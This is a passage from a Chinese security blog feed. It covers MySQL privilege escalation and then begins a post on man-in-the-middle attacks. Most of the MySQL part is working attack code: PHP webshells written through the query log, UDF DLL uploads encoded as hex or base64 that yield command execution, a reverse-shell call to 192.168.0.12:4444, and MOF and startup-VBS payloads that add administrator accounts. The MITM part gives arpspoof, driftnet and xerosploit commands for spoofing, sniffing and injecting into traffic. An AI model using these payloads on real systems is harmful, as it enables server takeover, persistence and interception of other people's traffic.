&quot;C:/phpStudy/PHPTutorial/www/moonback.php&quot;%23</span></span><br></pre></td></tr></table></figure><p>可以直接用sqlmap写webshell文件</p><img src="/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/TIM截图20200331223516.png" style="zoom: 80%;"><h3 id="利用日志写shell"><a href="#利用日志写shell" class="headerlink" title="利用日志写shell"></a>利用日志写shell</h3><p>前提是知道mysql root用户密，这里以phpmyadmin为例</p><p>开启日志记录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="string">&#x27;on&#x27;</span>;</span><br></pre></td></tr></table></figure><p>日志文件导出指定目录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file=<span class="string">&#x27;C:/phpstudy/PHPTutorial/WWW/1.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p>记录sql语句写马</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php array_udiff_assoc(array($_REQUEST[1]), array(1), &quot;ass&quot;.&quot;ert&quot;);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>关闭记录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="keyword">off</span>;</span><br></pre></td></tr></table></figure><img src="/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/TIM截图20200331212354.png" style="zoom:80%;"><h2 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h2><h3 id="udf提权简介"><a href="#udf提权简介" class="headerlink" title="udf提权简介"></a>udf提权简介</h3><p>UDF(user-defined function)是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p><p><strong>动态链接库：</strong>是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用</p><p>udf提权的前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>当然udf提权的前提是开启secure_file_priv参数</p><p>首先我们要判断mysql版本，根据不同的版本：</p><ul><li>mysql版本 &lt; 5.2 , UDF导出到系统目录<code>c:/windows/system32/</code></li><li>mysql版本 &gt; 5.2 ，UDF导出到安装路径<code>MySQL/lib/plugin/</code>，默认是没plugin路径的</li></ul><p>查询插件安装目录：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">VARIABLES</span> <span class="keyword">LIKE</span> <span class="string">&#x27;%plugin%&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/TIM截图20200331214935.png" style="zoom:80%;"><h4 id="大马提权"><a href="#大马提权" class="headerlink" title="大马提权"></a>大马提权</h4><p>这里用的是：<a href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php">https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php</a></p><p>上传udf.php,登录进去，它会自动判断<code>mysql</code>版本决定出导出<code>dll</code>文件位置</p><img src="/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/TIM截图20200331215307.png" style="zoom:80%;"><p>先点Create PluginDir创建plugin目录，然后Dump UDF –&gt; Create Function –&gt; Mysql_query依次导出dll到指定目录，将udf的自定义函数引入，执行命令</p><p>可以看到我们已经拿到这台靶机的管理员权限</p><p><img src="/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/TIM%E6%88%AA%E5%9B%BE20200331222304.png"></p><p>想要删除函数可以用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> shell; 删除函数</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> mysql.func <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">&#x27;shell&#x27;</span>  删除函数</span><br></pre></td></tr></table></figure><h4 id="手工提权"><a href="#手工提权" class="headerlink" title="手工提权"></a>手工提权</h4><p>先查看一下系统架构</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @@version_compile_os, @@version_compile_machine;</span><br></pre></td></tr></table></figure><p>然后把对应系统udf.dll或者udf.so上传上去</p><p>网址：<a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p><p>上传的时候我们可以使用网络路径</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">&#x27;\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll&#x27;</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">&quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;</span>;</span><br></pre></td></tr></table></figure><p>另一种方法是将整个DLL文件以十六进制编码后写入磁盘。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">load_file</span>(<span class="string">&#x27;/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll&#x27;</span>)) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">&#x27;/tmp/udf.hex&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="number">0x4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000000000</span>… <span class="keyword">into</span> dump <span class="keyword">file</span> <span class="string">&quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;</span>;</span><br></pre></td></tr></table></figure><p>还有一种方法是创建一个表并将二进制数据插入到十六进制编码流中。你可以通过insert语句或将其分解为多个部分，然后通过update语句拼接二进制数据。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> temp(<span class="keyword">data</span> longblob);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> temp(<span class="keyword">data</span>) <span class="keyword">values</span> (<span class="number">0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">update</span> temp <span class="keyword">set</span> <span class="keyword">data</span> = <span class="keyword">concat</span>(<span class="keyword">data</span>,<span class="number">0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">data</span> <span class="keyword">from</span> temp <span class="keyword">into</span> dump <span class="keyword">file</span> <span class="string">&quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;</span>;</span><br></pre></td></tr></table></figure><p>或者你也可以直接从磁盘将文件从网络共享加载到上面创建的表中，或使用“快速导入数据（load data infile）”语句在本地加载。将文件像上面显示的那样转换为十六进制，并在写入磁盘时解码。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> <span class="string">&#x27;\\\\192.168.0.19\\network\\udf.hex&#x27;</span> </span><br><span class="line"><span class="keyword">into</span> <span class="keyword">table</span> temp <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">&#x27;@OsandaMalith&#x27;</span> </span><br><span class="line"><span class="keyword">lines</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">&#x27;@OsandaMalith&#x27;</span> (<span class="keyword">data</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">unhex</span>(<span class="keyword">data</span>) <span class="keyword">from</span> temp <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">&#x27;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这里有个好消息，就是从MySQL 5.6.1和MariaDB 10.0.5开始，新增了to_base64和from_base64函数。如果你是一个善于绕过SQL注入WAF的人，相信你已经在使用这些函数了（提示：路由查询注入）。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">to_base64</span>(<span class="keyword">load_file</span>(<span class="string">&#x27;/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll&#x27;</span>)) </span><br><span class="line"><span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">&#x27;/tmp/udf.b64&#x27;</span>;</span><br></pre></td></tr></table></figure><p>你可以编辑base64文件并通过以下方式将其dump到插件目录。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">from_base64</span>(<span class="string">&quot;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span><br><span class="line"><span class="string">AAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v</span></span><br><span class="line"><span class="string">ZGUuDQ0KJAAAAAAAAAAzwu3gd6ODs3ejg7N3o4OzafEQs3Wjg7Np8QCzfaODs2nxB7N1o4OzUGX4</span></span><br><span class="line"><span class="string">s3Sjg7N3o4KzW6ODs2nxCrN2o4OzafEWs3Wjg7Np8RGzdqODs2nxErN2o4OzUmljaHejg7MAAAAA</span></span><br><span class="line"><span class="string">AAAAAAAAAAAAAAAAUEUAAGSGBgBwsYNLAAAAAAAAAADwACIgCwIJAAASAAAAFgAAAAAAADQaAAAA</span></span><br><span class="line"><span class="string">EAAAAAAAgAEAAAAAEAAAAAIAAAUAAgAAAAAABQACAAAAAAAAgAAAAAQAADPOAAACAEABAAAQAAAA</span></span><br><span class="line"><span class="string">AAAAEAAAAAAAAAAAEAAAAAAAABAAAAAAAAAAAAAAEAAAAAA5AAAFAgAAQDQAADwAAAAAYAAAsAIA</span></span><br><span class="line"><span class="string">AABQAABoAQAAAAAAAAAAAAAAcAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span><br><span class="line"><span class="string">AAAAAAAAAAAAAAAAAAAAAAAwAABwAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAAAR</span></span><br><span class="line"><span class="string">EAAAABAAAAASAAAABAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAABQsAAAAwAAAADAAAABYAAAAA&quot;</span>) </span><br><span class="line"><span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">&quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;</span>;</span><br></pre></td></tr></table></figure><p>之后，你可以像这样将整个文件传递给mysql。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h192.168.0.30 -uosanda -pabc123 &lt; /tmp/udf.b64</span><br></pre></td></tr></table></figure><p>你也可以从网络共享写入base64编码文件或使用“快速导入数据（load data infile）”语句在本地加载并通过以下语句dump。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">from_base64</span>(<span class="keyword">data</span>) <span class="keyword">from</span> temp </span><br><span class="line"><span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">&#x27;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&#x27;</span>;</span><br></pre></td></tr></table></figure><p>接着将udf的自定义函数引入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> <span class="keyword">STRING</span> <span class="keyword">SONAME</span> <span class="string">&#x27;udf.dll&#x27;</span></span><br></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="反弹端口提权"><a href="#反弹端口提权" class="headerlink" title="反弹端口提权"></a>反弹端口提权</h4><p>原理就是基于udf提权</p><p><strong>exp：</strong><a href="https://github.com/BeyondOneself/mysql-reverse-shell-priviledge">https://github.com/BeyondOneself/mysql-reverse-shell-priviledge</a></p><p>声明一个<code>backdoor</code>函数，第二条定义的<code>@a</code>是<code>udf.dll</code>内容的<code>16</code>进制</p><p>执行即可成功反弹shell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> backshell(<span class="string">&quot;192.168.0.12&quot;</span>,<span class="number">4444</span>);</span><br></pre></td></tr></table></figure><h2 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h2><h3 id="mof提权简介"><a href="#mof提权简介" class="headerlink" title="mof提权简介"></a>mof提权简介</h3><p>MOF文件是mysql数据库的扩展文件（在<code>c:/windows/system32/wbem/mof/nullevt.mof</code>）叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡。</p><p>MOF文件既然每五秒就会执行，而且是系统权限，我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>Windows&lt;=2003</li><li>mysql在c:windows/system32/mof目录有写权限</li><li>已知数据库账号密码</li></ul><p><strong>exp:</strong></p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(<span class="string">&quot;\\\\.\\root\\subscription&quot;</span>)</span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = <span class="string">&quot;Root\\Cimv2&quot;</span>;</span><br><span class="line">Name = <span class="string">&quot;filtP2&quot;</span>;</span><br><span class="line">Query = <span class="string">&quot;Select * From __InstanceModificationEvent &quot;</span></span><br><span class="line"><span class="string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="string">&quot; &quot;</span></span><br><span class="line"><span class="string">&quot;And TargetInstance.Second = 5&quot;</span>;</span><br><span class="line">QueryLanguage = <span class="string">&quot;WQL&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = <span class="string">&quot;consPCSV2&quot;</span>;</span><br><span class="line">ScriptingEngine = <span class="string">&quot;JScript&quot;</span>;</span><br><span class="line">ScriptText =</span><br><span class="line"><span class="string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="string">&quot;)\nWSH.run(\&quot;</span>net.exe user test <span class="number">123456</span> /add\<span class="string">&quot;)&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = $Consumer;</span><br><span class="line"><span class="built_in">Filter</span> = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>确保了前面的条件之后，我们可以先上传我们的mof文件到服务器任意目录，一般是网站允许上传的目录。</p><p>然后通过mysql语句将这个文件导入到nullevt.mof</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">&quot;F:/wamp/www/upload/test.mof&quot;</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">&quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</span></span><br></pre></td></tr></table></figure><p>这里用到了dumpfile而不是outfile是因为：</p><ul><li>dumpfile只能导出一行数据</li><li>outfile可以完整的导出每行记录，并且会在行末端写入新行，并且会转义换行符。</li></ul><p>如果用outfile这个二进制可执行文件就会被破坏，所以这里我们使用了dumpfile。</p><p>然后我们分别两次将创建用户和提权命令替换poc中的命令做上述操作即可。两次使用的命令如下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net.exe user test 123456 /add</span><br><span class="line">net.exe user localgroup administrators test /add</span><br></pre></td></tr></table></figure><p>删除账号需要重启服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net stop winmgmt</span><br><span class="line">del c:/windows/system32/wbem/repository</span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure><p>按照这种思路我们也可以写vbs到开机启动项</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> a (cmd <span class="built_in">text</span>); </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> a <span class="keyword">values</span> (<span class="string">&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;) &quot;</span> ); </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> a <span class="keyword">values</span> (<span class="string">&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user hpdoger 123456 /add&quot;&quot;,0) &quot;</span> ); </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> a <span class="keyword">values</span> (<span class="string">&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup administrators hpdoger /add&quot;&quot;,0) &quot;</span> ); </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> a <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">&quot;C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs&quot;</span>;</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://xz.aliyun.com/t/7392">https://xz.aliyun.com/t/7392</a></p><p><a href="https://wh0ale.github.io/2019/01/06/2019-1-6-Mysql%E6%8F%90%E6%9D%83">https://wh0ale.github.io/2019/01/06/2019-1-6-Mysql%E6%8F%90%E6%9D%83</a></p><p><a href="https://xz.aliyun.com/t/2719">https://xz.aliyun.com/t/2719</a></p><p><a href="https://www.freebuf.com/articles/system/163144.html">https://www.freebuf.com/articles/system/163144.html</a></p><p><a href="https://uuzdaisuki.com/2018/07/02/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">https://uuzdaisuki.com/2018/07/02/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中间人攻击学习</title>
      <link href="2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍中间人攻击的相关内容！</p><a id="more"></a><p><strong>本文仅作技术交流，请勿做违法乱纪的事！</strong></p><h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p>中间人攻击（Man-in-the-MiddleAttack，简称“MITM攻击”）是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为“中间人”。这样的话，两台通信计算机之间的流量都会经过被控计算机，通过信息篡改，信息窃取等方式对正常的通信造成威胁。</p><p>随着计算机通信网技术的不断发展，MITM攻击也越来越多样化。最初，攻击者只要将网卡设为混杂模式，伪装成代理服务器监听特定的流量就可以实现攻击，这是因为很多通信协议都是以明文来进行传输的，如HTTP、FTP、Telnet等。后来，随着交换机代替集线器，简单的嗅探攻击已经不能成功，必须先进行ARP欺骗才行。如今，越来越多的服务商（网上银行，邮箱登陆）开始采用加密通信，SSL(Secure Sockets Layer 安全套接层)是一种广泛使用的技术，HTTPS、FTPS等都是建立在其基础上的。</p><h2 id="arp地址欺骗"><a href="#arp地址欺骗" class="headerlink" title="arp地址欺骗"></a>arp地址欺骗</h2><p>在同一局域网内的主机通信依靠arp地址而不是ip地址，当两台主机通信时(A 和 B)，主机A 向主机B发送一个arp广播（内有主机B的IP地址），局域网内的所有主机都会收到这个arp包，然后与在自己的ip地址进行比较，如果符合就回复给主机 A 一个带有自己的arp地址的arp包，同时将主机 A 的arp地址记录下来。接着使用这个MAC地址发送数据（由网卡附加MAC地址）。因此，本地高速缓存的这个ARP表是本地网络流通的基础，而且这个缓存是动态的，主机的每次通信都需要从新发送arp广播包得到主机 B 的arp地址（动态性）。</p><p>如果这时有一台主机C想要获取两台主机的通信过程时，主机C 可以主动向主机A 发送 arp应答包 主机A接收到这个应答包后更新自己的arp缓存表 当然还是B的ip但mac地址已经改变 ，这时主机C再正常连接主机B，这样就可以监听双方的通信过程并且不被发现 ，这是一种最典型的arp欺骗。</p><img src="/2020/03/25/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/TIM截图20200325231032.png" style="zoom:50%;"><h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><h3 id="arp-scan"><a href="#arp-scan" class="headerlink" title="arp-scan"></a>arp-scan</h3><p>arp-scan是Kali Linux自带的一款ARP扫描工具。该工具可以进行单一目标扫描，也可以进行批量扫描。批量扫描的时候，用户可以通过CIDR、地址范围或者列表文件的方式指定。该工具允许用户定制ARP包，构建非标准数据包。同时，该工具会自动解析Mac地址，给出MAC对应的硬件厂商，帮助用户确认目标。</p><p><strong>查看同一局域网存活的主机：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan --interface=wlan0 --localnet</span><br></pre></td></tr></table></figure><h3 id="arpspoof"><a href="#arpspoof" class="headerlink" title="arpspoof"></a>arpspoof</h3><p>arpspoof是一个好用的ARP欺骗工具。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</span><br></pre></td></tr></table></figure><ul><li>-i 指定网卡</li><li>-c 指定还原arp配置时使用的硬件地址</li><li>-t 指定arp欺骗的目标</li><li>host一般为网关</li><li>-r 欺骗两个主机（网关和目标）以捕获双向通信</li></ul><p><strong>欺骗网关和目标：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i wlan0 -t 192.168.1.105 -r 192.168.1.1</span><br></pre></td></tr></table></figure><h3 id="driftnet"><a href="#driftnet" class="headerlink" title="driftnet"></a>driftnet</h3><p>driftnet是一款简单而使用的图片捕获工具，可以很方便的在网络数据包中抓取图片。该工具可以实时和离线捕获指定数据包中是图片，kali里默认有。</p><p><strong>主要参数：</strong></p><ul><li><p>-b  捕获到新的图片时发出嘟嘟声</p></li><li><p>-i interface   选择监听接口</p></li><li><p>-f file  读取一个指定pcap数据包中的图片</p></li><li><p>-p 不让所监听的接口使用混杂模式</p></li><li><p>-a 后台模式：将捕获的图片保存到目录中（不会显示在屏幕上）</p></li><li><p>-m number 指定保存图片数的数目</p></li><li><p>-d directory 指定保存图片的路径</p></li><li><p>-x prefix 指定保存图片的前缀名</p></li></ul><p><strong>后台监听网卡保存图片并提示：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i wlan0 -b -a -d /root/Desktop/pic</span><br></pre></td></tr></table></figure><h3 id="xerosploit"><a href="#xerosploit" class="headerlink" title="xerosploit"></a>xerosploit</h3><p>github地址：<a href="https://github.com/LionSec/xerosploit">https://github.com/LionSec/xerosploit</a></p><p>Xerosploit是一款可以进行中间人攻击的渗透测试工具包。它具有多种模块，可以进行多重有效的攻击，如拒绝服务和端口扫描、劫持等。由bettercap和nmap强力驱动。</p><p>可惜的是，这款工具已经很长时间不维护了，但功能依旧很强大</p><p>工具安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/LionSec/xerosploit</span><br><span class="line"><span class="built_in">cd</span> xerosploit &amp;&amp; sudo python install.py</span><br><span class="line">sudo xerosploit</span><br></pre></td></tr></table></figure><p>安装中可能会会缺少依赖包，直接pip安装就行</p><p>有这么多模块，直接使用就行，非常方便：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pscan：端口扫描</span><br><span class="line">dos：对目标进行dos攻击</span><br><span class="line">ping：对目标进行ping是否存活</span><br><span class="line">injecthtml：将html注入到目标访问的网站中</span><br><span class="line">injectjs：将javascript注入到目标访问的网站中</span><br><span class="line">rdownload：替换目标下载的文件</span><br><span class="line">sniff：嗅探目标的流量信息</span><br><span class="line">dspoof：将所有http流量重定向到特定ip</span><br><span class="line">yplay：在目标的浏览器中后台播放youtube视频（还得fq）</span><br><span class="line">replace：替换目标访问网站的所有图片</span><br><span class="line">driftnet：查看目标访问网站的所有图片</span><br><span class="line">move：让目标访问网站变得抖动</span><br><span class="line">deface：将目标访问网站的所有页面替换成自己定义的html代码</span><br></pre></td></tr></table></figure><h2 id="抓取局域网里的图片"><a href="#抓取局域网里的图片" class="headerlink" 